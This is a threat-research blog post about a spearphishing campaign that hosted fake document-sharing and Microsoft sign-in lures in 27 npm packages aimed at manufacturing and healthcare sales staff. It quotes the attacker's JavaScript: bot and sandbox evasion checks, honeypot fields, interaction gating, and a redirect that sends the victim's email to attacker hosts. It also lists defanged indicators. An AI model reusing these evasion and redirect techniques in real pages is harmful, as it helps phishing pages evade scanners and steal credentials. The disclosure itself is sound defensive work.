---
title: "Spearphishing Campaign Abuses npm Registry to Target U.S. and Allied Manufacturing and Healthcare Organizations"
short_title: "npm-Hosted Spearphishing Targets U.S. Manufacturing"
date: 2025-12-23 12:00:00 +0000
categories: [Malware, npm]
tags: [npm, Spearphishing, Phishing, Credential Theft, Microsoft, Supply Chain Security, AiTM, Manufacturing, Healthcare, Critical Infrastructure, Obfuscation, NATO, United States, Industrial Automation, Plastics, Evilginx, T1195.002, T1608.001, T1589.002, T1589.003, T1591.004, T1059.007, T1036, T1656, T1566.002, T1583.006, T1027, T1557, T1562, T1480, T1497, T1078, T1539]
author: kirill_and_nicholas
canonical_url: https://socket.dev/blog/spearphishing-campaign-abuses-npm-registry
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/d02135698302a9cf8b8d154c0bd5a0641305dbc6-1024x1024.png?w=1000&q=95&fit=max&auto=format
  alt: Spearphishing Campaign Abuses npm Registry
description: "A five-month operation turned 27 npm packages into durable hosting for browser-run lures that mimic document-sharing portals and Microsoft sign-in, targeting sales personnel at critical infrastructure organizations."
---

<div class="prose" dir="ltr">

<p>The Socket Threat Research Team uncovered a sustained and targeted phishing (spearphishing) operation that has abused the npm registry as a hosting and distribution layer for at least five months. We identified 27 malicious npm packages published under six different npm aliases, all designed to deliver browser-executed phishing components that impersonate secure document-sharing workflows and Microsoft sign-in pages.</p>

<p>The campaign is highly-targeted, focusing on sales and commercial personnel at critical infrastructure-adjacent organizations in the United States and allied nations. Across this cluster, we identified 25 distinct targeted individuals in manufacturing, industrial automation, plastics, and healthcare sectors, consistent with victim-specific preparation rather than broad, opportunistic distribution.</p>

<p>This operation repurposes npm and package CDNs into durable hosting infrastructure, delivering client-side HTML and JavaScript lures that the threat actor embeds directly in phishing pages. Across the operation, packages follow the same flow. For example, <a href="https://socket.dev/npm/package/adril7123"><code>adril7123</code></a> (still live as of this writing) delivers a browser-executed component that replaces the page content, displays a "secure document-sharing" verification gate, and then transitions the victim to a Microsoft-branded sign-in screen with the target's email address prefilled to drive credential capture. This and other packages in the cluster also include client-side defenses intended to hinder analysis, including honeypot form fields, bot-detection checks, and interaction-gating that requires mouse or touch input before proceeding. After the victim completes the flow, the script redirects the browser to threat actor-controlled infrastructure and carries the victim identifier in the URL fragment for downstream credential harvesting.</p>

<p>Several of the domains embedded in these packages overlap with publicly documented adversary-in-the-middle (AiTM) phishing infrastructure associated with <a href="https://www.orangecyberdefense.com/de/blog/threat/teil-2-cybersoc-insights-untersuchung-einer-aitm-phishing-kampagne?utm_source=chatgpt.com">Evilginx</a> redirector patterns (for example, <code>/wlc/</code>, <code>/load/</code>, and <code>/success/</code>). In AiTM scenarios, this handoff infrastructure can do more than collect passwords by brokering the session through a threat actor-controlled proxy and enabling theft of session cookies or tokens during interactive authentication, which can undermine traditional MFA.</p>

<p>We reported this campaign and the remaining live package to the npm security team and requested suspension of the publisher's account. We also notified 25 targeted organizations and shared relevant indicators to support triage.</p>

<figure>
<img src="https://cdn.sanity.io/images/cgdhsj6q/production/15ce8764e0e79d81947220c4d31590bf2ef47d45-623x606.png" alt="Socket AI Scanner's analysis of the malicious adril7123 package." />
<figcaption><em>Socket AI Scanner's analysis of the malicious </em><a href="https://socket.dev/npm/package/adril7123">adril7123</a><em> package flags </em><a href="https://socket.dev/npm/package/adril7123/files/14.0.0/assets/refinered.bundles.js">assets/refinered.bundles.js</a><em> as a phishing component that fabricates a Microsoft login flow, uses client-side bot and honeypot checks to evade automated analysis, and redirects users to threat actor-controlled infrastructure while carrying a hardcoded target email.</em></figcaption>
</figure>

<h2>Threat Actor Strategy and Attack Chain</h2>

<p>Threat actors have already demonstrated that the npm ecosystem can function as phishing infrastructure rather than an <code>install</code>-time compromise vector. In October 2025, Kush Pandya of the Socket Threat Research Team <a href="https://socket.dev/blog/175-malicious-npm-packages-host-phishing-infrastructure">analyzed</a> the Beamglea campaign, where hundreds of throwaway npm packages were used as CDN-hosted redirectors (via <code>unpkg.com</code>) to funnel victims from local "business document" lures to credential-harvesting pages, often passing the victim's email in the URL fragment to support prefill.</p>

<p>Based on the differing package structure (full browser-rendered lure flows versus Beamglea's <code>unpkg</code>-hosted redirect scripts), distinct implementation patterns (DOM overwrite, interaction gating, and client-side anti-analysis controls), and non-overlapping credential-collection infrastructure, we assess this cluster as a separate operation attributed to a different threat actor than Beamglea.</p>

<p>This campaign follows the same core playbook, but with different delivery mechanics. Instead of shipping minimal redirect scripts, these packages deliver a self-contained, browser-executed phishing flow as an embedded HTML and JavaScript bundle that runs when loaded in a page context. The package code stores the entire phishing page as a template string, then wipes the current page and replaces it with threat actor-controlled content using <a href="https://socket.dev/npm/package/adril7123/files/14.0.0/assets/refinered.bundles.js#L235"><code>document.open()</code></a>, <a href="https://socket.dev/npm/package/adril7123/files/14.0.0/assets/refinered.bundles.js#L236"><code>document.write()</code></a>, and <a href="https://socket.dev/npm/package/adril7123/files/14.0.0/assets/refinered.bundles.js#L237"><code>document.close()</code></a>. In several packages, the browser-delivered JavaScript bundles are also <a href="https://socket.dev/npm/package/sync365/files/2.14.51/scripts/api.min.js">obfuscated</a> or heavily minified, which reduces visibility into embedded redirector logic and complicates automated inspection.</p>

<h2>Credential Theft Begins with a Document-Sharing Lure</h2>

<p>The phishing page embedded in the packages masquerades as a "MicroSecure" document-sharing service, claiming that business documents were shared with a specific recipient. The targeted recipient's email address is hardcoded into the page. To reinforce its legitimacy, the lure references a fabricated <code>Documents.pdf</code> containing RFQs, company profiles, technical descriptions and layout drawings.</p>

<p>Interaction is gated behind basic anti-analysis controls. The "Verify and Continue" button remains disabled until human input is detected. Right-click and clipboard actions are <a href="https://socket.dev/npm/package/adril7123/files/14.0.0/assets/refinered.bundles.js#L98">blocked</a> to hinder inspection and automated analysis.</p>

<figure>
<img src="https://cdn.sanity.io/images/cgdhsj6q/production/2f4d54017438e14ca4c606e9a3a64432b4a13420-1693x882.png" alt="The phishing flow presenting a fake MicroSecure document-sharing page then a Microsoft sign-in prompt." />
<figcaption><em>The phishing flow first presents a fake "MicroSecure" document-sharing verification page that references RFQ-style content, then switches to a Microsoft-branded sign-in prompt that pre-fills the targeted email address and directs the user to re-authenticate ("Session timed out") to drive credential capture. The Socket Threat Research Team replaced the original targeted email addresses with redacted placeholders.</em></figcaption>
</figure>

<h2>Anti-Analysis Logic: Bot and Sandbox Evasion</h2>

<p>The packages implement lightweight client-side checks to screen out automated analysis. The script tests for common automation signals, including <a href="https://socket.dev/npm/package/adril7123/files/14.0.0/assets/refinered.bundles.js#L166"><code>navigator.webdriver</code></a>, empty plugin lists, abnormal screen dimensions, and user-agent strings associated with crawlers or headless browsers. When these checks trip, the page treats the session as automated or sandboxed and blocks the flow.</p>

<p>Here and below is the threat actor's <a href="https://socket.dev/npm/package/adril7123/files/14.0.0/assets/refinered.bundles.js#L166">code</a> with inline comments, and defanged where necessary.</p>

<pre><code class="language-javascript">function isProbablyBot() {     // Lightweight bot and sandbox checks
 return (
  navigator.webdriver ||       // Common automation flag (e.g., Selenium)
  !navigator.plugins.length || // Headless profiles often report zero plugins
  screen.width === 0 ||        // Non-interactive/sandboxed display anomaly
  screen.height === 0 ||       // Non-interactive/sandboxed display anomaly
  !navigator.userAgent ||      // Missing user agent; unusual in real browsers
   /bot|crawl|spider|headless|HeadlessChrome/i.test(navigator.userAgent)
                               // UA regex for crawlers and headless browsers
  );
}</code></pre>

<h2>User-Input Checks Before Credential Capture</h2>

<p>The page <a href="https://socket.dev/npm/package/adril7123/files/14.0.0/assets/refinered.bundles.js#L174">gates</a> progress on real user input. It enables the "Verify and Continue" button only after basic bot checks pass and the script observes mouse or touch events. This blocks many automated scanners that do not simulate interaction from advancing through the flow.</p>

<pre><code class="language-javascript">let humanInteracted = false;                            // Open the gate once

function enableButtonIfHuman() {
 if (!humanInteracted &amp;&amp; !isProbablyBot()) {
    document.getElementById('verify').disabled = false; // Enable "Verify" button
    humanInteracted = true;                             // Stop re-checking
  }
}

document.addEventListener('mousemove', enableButtonIfHuman);  // Mouse input gate
document.addEventListener('touchstart', enableButtonIfHuman); // Touch input gate</code></pre>

<h2>Anti-Analysis Control: Honeypot Form Inputs</h2>

<p>The phishing flow uses a classic honeypot pattern to screen out automation. Both stages include a hidden text field <code>company</code> that is not meant to be filled by a real user. Many crawlers and "smart" form fillers will populate every input they see in the DOM, even when the element is visually hidden. The threat actor repeats the same control twice, once in the "MicroSecure" gate and again on the Microsoft-lookalike step, which increases confidence that the operator expects both automated scanning and repeated analysis attempts.</p>

<pre><code class="language-javascript">&lt;input type="text" name="company" class="honeypot-field" autocomplete="off" /&gt;
&lt;!-- Stage 1 honeypot: hidden bot trap --&gt;

...

&lt;input type="text" name="company" class="honeypot" autocomplete="off" /&gt;
&lt;!-- Stage 2 honeypot: same bot trap on the Microsoft-lookalike step --&gt;</code></pre>

<p>Real users never see or complete this field, but automated form fillers often populate it. If the field contains any value, the script blocks progression and returns a generic verification error early in the flow.</p>

<pre><code class="language-javascript">const honeypot =
  document.querySelector('input[name="company"]').value.trim(); // Honeypot value

...

if (honeypot !== "" || !token || isProbablyBot()) { // Fail closed on bot signals
  alert("Verification failed. Please try again.");  // Generic error, hides logic
  return;                                           // Stop the flow
}</code></pre>

<p>On the final step, the script re-runs the honeypot and bot checks. If they fail, it frames the block as "suspicious activity", then clears the page content and forces a black screen, a fail-closed behavior that also frustrates repeat analysis and full-flow detonation.</p>

<pre><code class="language-javascript">const honeypot =
  this.querySelector('input[name="company"]').value;       // Honeypot value

...

if (honeypot.trim() !== "" || isProbablyBot() || !token) {
// Fail closed on bot signals
  alert("Suspicious activity detected. Try again.");       // Generic warning
  document.body.innerHTML = '';                            // Wipe the DOM
  document.body.style.backgroundColor = '#000';            // Dead-end black page
  return;                                                  // Stop the flow
}</code></pre>

<p>The script pre-fills the target email address and locks it read-only, then uses a "session timed out" prompt to push the victim to re-authenticate. This step does not perform actual authentication. The <code>sessionToken</code> value functions as a client-side gate and placeholder, and the component defers any credential handling until the user submits the form.</p>

<p>After the victim submits credentials on the Microsoft-lookalike step, the component does not authenticate to Microsoft. Instead, it redirects the browser to an external, non-Microsoft endpoint controlled by the threat actor and passes the victim identifier in the URL fragment for downstream tracking or email prefill during credential harvesting.</p>

<pre><code class="language-javascript">window.location.href =
 "hxxps://[DOMAIN]/[PATH]#[REDACTED_EMAIL]";
 // Redirect to threat actor-controlled infrastructure for credential collection
});</code></pre>

<h2>Threat Actor-Controlled Credential Collection Infrastructure</h2>

<p>In this cluster, we identified threat actor-controlled redirector and credential collection hosts embedded directly in the npm-delivered lures, including:</p>

<ul>
<li><code>livestore[.]click</code>
  <ul><li><code>livestore[.]click/wlc/</code></li></ul>
</li>
<li><code>hexrestore[.]online</code>
  <ul><li><code>hexrestore[.]online/load/</code></li></ul>
</li>
<li><code>leoclouder[.]online</code>
  <ul>
    <li><code>leoclouder[.]online/load/</code></li>
    <li><code>leoclouder[.]online/success/</code></li>
  </ul>
</li>
<li><code>jigstro[.]cloud</code>
  <ul><li><code>jigstro[.]cloud/wlc/</code></li></ul>
</li>
<li><code>extfl[.]roundupactions[.]shop</code></li>
</ul>

<p>The packages use these endpoints as a handoff after the browser-rendered lure stage, shifting the victim from an npm/CDN-hosted component to threat actor-controlled web infrastructure where credential harvesting and, in AiTM scenarios, session hijacking can occur.</p>

<p>Several of these domains also align with publicly documented AiTM phishing infrastructure. André Henschel of Orange Cyberdefense <a href="https://www.orangecyberdefense.com/de/blog/threat/teil-2-cybersoc-insights-untersuchung-einer-aitm-phishing-kampagne?utm_source=chatgpt.com">describes</a> an Evilginx-based AiTM campaign and lists confirmed redirector URL patterns that match domains we observed, including <code>hexrestore[.]online/load/</code>, <code>leoclouder[.]online/load/</code> and <code>/success/</code>, <code>livestore[.]click/wlc/</code>, and <code>jigstro[.]cloud/wlc/</code>.</p>

<p>In the analysis, the redirectors orchestrate the phishing session by accepting victim identifiers, retrieving tenant branding and routing context, and brokering requests to a threat actor-controlled proxy. Henschel documents calls to redirector endpoints such as <code>/fwd/api</code> and <code>/o365</code> to obtain organization context and advance the flow into a Microsoft-lookalike login experience. Because the campaign uses AiTM via Evilginx, the threat actor can capture session cookies or tokens as the victim completes interactive authentication, which is a common way AiTM phishing defeats traditional MFA.</p>

<h2>Targeted Organizations</h2>

<p>This campaign is built around a curated target set, not broad spray-and-pray delivery. Across the cluster, the phishing packages hardcode recipient email addresses tied to specific individuals, and those identities consistently align with commercial-facing roles such as account managers, sales, and business development representatives. These functions routinely handle inbound RFQs and shared documents, and are more likely than most teams to open unsolicited inquiries and attachments. This context aligns closely with the campaign's document-sharing pretext and Microsoft sign-in credential capture flow.</p>

<p>The targeted organizations concentrate in critical infrastructure-adjacent sectors, including manufacturing, industrial automation, plastics and polymer supply chains, healthcare and pharmaceutical production ecosystems.</p>

<p>Geographically, targets span the United States and multiple international locations across North America, Europe, and East Asia. In several cases, target locations differ from corporate headquarters, which is consistent with threat actor's focus on regional sales staff, country managers, and local commercial teams rather than only corporate IT.</p>

<figure>
<img src="https://cdn.sanity.io/images/cgdhsj6q/production/9da2ef4c582775f9db308672a73ca6c72535568e-1830x933.png" alt="Map visualization highlighting targeted countries in the npm-hosted spearphishing operation." />
<figcaption><em>Map visualization highlighting the countries targeted in this npm-hosted spearphishing operation: Austria, Belgium, Canada, France, Germany, Italy, Portugal, Spain, Sweden, Taiwan, Turkey, the United Kingdom, and the United States, spanning North America, Europe, and East Asia region. Most of the highlighted countries are U.S. allies or close partners.</em></figcaption>
</figure>

<p>We cannot verify how the threat actor obtained email addresses. However, many targeted companies operate in industrial sectors that repeatedly converge at major international trade shows, including <a href="https://www.interpack.com/">Interpack</a> and <a href="https://www.k-online.com/">K-Fair</a>. Company participation at these events is publicly documented, and exhibitor directories often surface business contact details. A plausible hypothesis is that the threat actor used these sources to identify sales contacts, then tailored RFQ-themed lures around a workflow where sales teams routinely expect unsolicited outreach.</p>

<figure>
<img src="https://cdn.sanity.io/images/cgdhsj6q/production/c681be42b668908d9be5d03698793246ddeaf303-984x364.png" alt="Promotional banners for K-Fair and Interpack trade conferences." />
<figcaption><em>Promotional banners for K-Fair and Interpack, two major industry conferences where at least eight of the targeted companies appear as exhibitors, supporting the hypothesis that event ecosystems may help the threat actor identify and profile commercial contacts for RFQ-themed lures.</em></figcaption>
</figure>

<p>Open-web reconnaissance likely complements this process. Commercial staff frequently publish role, territory, and employer information on LinkedIn and other public pages, which can help a threat actor identify the right individuals and then derive or validate email formats using corporate naming conventions and publicly indexed contact pages.</p>

<h2>Outlook and Recommendations</h2>

<p>The npm registry is frequently <a href="https://socket.dev/blog/175-malicious-npm-packages-host-phishing-infrastructure">abused</a> as infrastructure for malicious campaigns. In this model, a "package" is less a dependency and more a delivery primitive. It can host a phishing component, serve a redirector stage, or embed a full visual lure that executes entirely in the browser, even if it never runs in <code>Node.js</code>. As long as package CDNs remain a reliable distribution layer, threat actors can treat registries as durable hosting that is resilient to takedowns, inexpensive to operate, and easy to rotate through publisher aliases and package names.</p>

<p>In the future, similar campaigns will likely continue to split functionality across multiple packages (lure UI, redirect logic, and remote collection endpoints), add more interaction gating and anti-analysis checks to evade automated scanners, and shift between domains and CDN paths to stay ahead of blocklists.</p>

<p>To reduce exposure to npm-hosted phishing infrastructure and AiTM-enabled credential theft, consider the following mitigations:</p>

<ul>
<li>Harden both the software supply chain and the browser execution surface.</li>
<li>Tighten dependency intake by verifying publishers, scrutinizing transitive dependencies, pinning versions, and scanning for high-risk artifacts that do not belong in typical libraries, including packaged HTML templates, DOM overwrite via <code>document.write()</code>, full-screen iframe overlays to external hosts, and heavily obfuscated browser bundles.</li>
<li>Treat package CDNs as a monitored control plane by logging and alerting on unusual CDN requests from non-development contexts, and blocking known malicious packages and domains where possible.</li>
<li>Assume credential phishing may be AiTM-enabled and require phishing-resistant MFA (WebAuthn/passkeys) and enforce conditional access.</li>
<li>Monitor for post-authentication compromise signals including session token theft indicators, suspicious sign-in telemetry, and abnormal OAuth events.</li>
</ul>

<p>Defenders should deploy controls that catch suspicious packages before selection, merge, or install. The <a href="https://socket.dev/features/github"><strong>Socket GitHub App</strong></a> scans pull requests in real time to flag risky dependencies, including packages that ship obfuscated browser bundles or unexpected payloads. The <a href="https://socket.dev/features/cli"><strong>Socket CLI</strong></a> extends enforcement to developer workflows by surfacing <code>install</code>-time red flags and blocking risky behaviors such as <code>postinstall</code> scripts, decrypt-and-eval loaders, unexpected network egress, or native binaries. For ecosystem-level prevention, <a href="https://socket.dev/blog/introducing-socket-firewall"><strong>Socket Firewall</strong></a> blocks known malicious packages, including transitive dependencies, before the package manager fetches them.</p>

<p>This campaign also creates exposure during package discovery and AI-assisted coding. The <a href="https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1"><strong>Socket browser extension</strong></a> warns on suspicious packages while browsing registries and CDN links, and <a href="https://socket.dev/blog/socket-mcp"><strong>Socket MCP</strong></a> helps prevent malicious or hallucinated dependencies from being introduced through LLM suggestions.</p>

<h2>Indicators of Compromise (IOCs)</h2>

<h3>Malicious npm Packages</h3>

<ol>
<li><a href="https://socket.dev/npm/package/adril7123"><code>adril7123</code></a></li>
<li><a href="https://socket.dev/npm/package/ardril712"><code>ardril712</code></a></li>
<li><a href="https://socket.dev/npm/package/arrdril712"><code>arrdril712</code></a></li>
<li><a href="https://socket.dev/npm/package/androidvoues"><code>androidvoues</code></a></li>
<li><a href="https://socket.dev/npm/package/assetslush"><code>assetslush</code></a></li>
<li><a href="https://socket.dev/npm/package/axerification"><code>axerification</code></a></li>
<li><a href="https://socket.dev/npm/package/erification"><code>erification</code></a></li>
<li><a href="https://socket.dev/npm/package/erificatsion"><code>erificatsion</code></a></li>
<li><a href="https://socket.dev/npm/package/errification"><code>errification</code></a></li>
<li><a href="https://socket.dev/npm/package/eruification"><code>eruification</code></a></li>
<li><a href="https://socket.dev/npm/package/hgfiuythdjfhgff"><code>hgfiuythdjfhgff</code></a></li>
<li><a href="https://socket.dev/npm/package/homiersla"><code>homiersla</code></a></li>
<li><a href="https://socket.dev/npm/package/houimlogs22"><code>houimlogs22</code></a></li>
<li><a href="https://socket.dev/npm/package/iuythdjfghgff"><code>iuythdjfghgff</code></a></li>
<li><a href="https://socket.dev/npm/package/iuythdjfhgff"><code>iuythdjfhgff</code></a></li>
<li><a href="https://socket.dev/npm/package/iuythdjfhgffdf"><code>iuythdjfhgffdf</code></a></li>
<li><a href="https://socket.dev/npm/package/iuythdjfhgffs"><code>iuythdjfhgffs</code></a></li>
<li><a href="https://socket.dev/npm/package/iuythdjfhgffyg"><code>iuythdjfhgffyg</code></a></li>
<li><a href="https://socket.dev/npm/package/jwoiesk11"><code>jwoiesk11</code></a></li>
<li><a href="https://socket.dev/npm/package/modules9382"><code>modules9382</code></a></li>
<li><a href="https://socket.dev/npm/package/onedrive-verification"><code>onedrive-verification</code></a></li>
<li><a href="https://socket.dev/npm/package/sarrdril712"><code>sarrdril712</code></a></li>
<li><a href="https://socket.dev/npm/package/scriptstierium11"><code>scriptstierium11</code></a></li>
<li><a href="https://socket.dev/npm/package/secure-docs-app"><code>secure-docs-app</code></a></li>
<li><a href="https://socket.dev/npm/package/sync365"><code>sync365</code></a></li>
<li><a href="https://socket.dev/npm/package/ttetrification"><code>ttetrification</code></a></li>
<li><a href="https://socket.dev/npm/package/vampuleerl"><code>vampuleerl</code></a></li>
</ol>

<h3>Threat Actor npm Aliases</h3>

<ol>
<li><a href="https://socket.dev/npm/user/dimkpa"><code>dimkpa</code></a></li>
<li><a href="https://socket.dev/npm/user/fineboi231"><code>fineboi231</code></a></li>
<li><a href="https://socket.dev/npm/user/kenkenjoe"><code>kenkenjoe</code></a></li>
<li><a href="https://socket.dev/npm/user/nuelvamp"><code>nuelvamp</code></a></li>
<li><a href="https://socket.dev/npm/user/michael.shaw119"><code>michael.shaw119</code></a></li>
<li><a href="https://socket.dev/npm/user/briandmooree"><code>briandmooree</code></a></li>
</ol>

<h3>Threat Actor Email Addresses</h3>

<ol>
<li><code>icpc12@proton[.]me</code></li>
<li><code>michael.shaw119@proton[.]me</code></li>
<li><code>nuelvamp@proton[.]me</code></li>
<li><code>briandmooree@proton[.]me</code></li>
<li><code>fineboi231@proton[.]me</code></li>
<li><code>safehavenbill@proton[.]me</code></li>
</ol>

<h3>C2 Infrastructure</h3>

<ul>
<li><code>extfl[.]roundupactions[.]shop</code></li>
<li><code>livestore[.]click</code>
  <ul><li><code>livestore[.]click/wlc/</code></li></ul>
</li>
<li><code>hexrestore[.]online</code>
  <ul><li><code>hexrestore[.]online/load/</code></li></ul>
</li>
<li><code>leoclouder[.]online</code>
  <ul>
    <li><code>leoclouder[.]online/load/</code></li>
    <li><code>leoclouder[.]online/success/</code></li>
  </ul>
</li>
<li><code>jigstro[.]cloud</code>
  <ul><li><code>jigstro[.]cloud/wlc/</code></li></ul>
</li>
</ul>

<h2>MITRE ATT&amp;CK</h2>

<ul>
<li>T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain</li>
<li>T1608.001 — Stage Capabilities: Upload Malware</li>
<li>T1589.002 — Gather Victim Identity Information: Email Addresses</li>
<li>T1589.003 — Gather Victim Identity Information: Employee Names</li>
<li>T1591.004 — Gather Victim Org Information: Identify Roles</li>
<li>T1059.007 — Command and Scripting Interpreter, JavaScript</li>
<li>T1036 — Masquerading</li>
<li>T1656 — Impersonation</li>
<li>T1566.002 — Phishing: Spearphishing Link</li>
<li>T1583.006 — Acquire Infrastructure: Web Services</li>
<li>T1027 — Obfuscated Files or Information</li>
<li>T1557 — Adversary-in-the-Middle</li>
<li>T1562 — Impair Defenses</li>
<li>T1480 — Execution Guardrails</li>
<li>T1497 — Virtualization/Sandbox Evasion</li>
<li>T1078 — Valid Accounts</li>
<li>T1539 — Steal Web Session Cookie</li>
</ul>

</div>
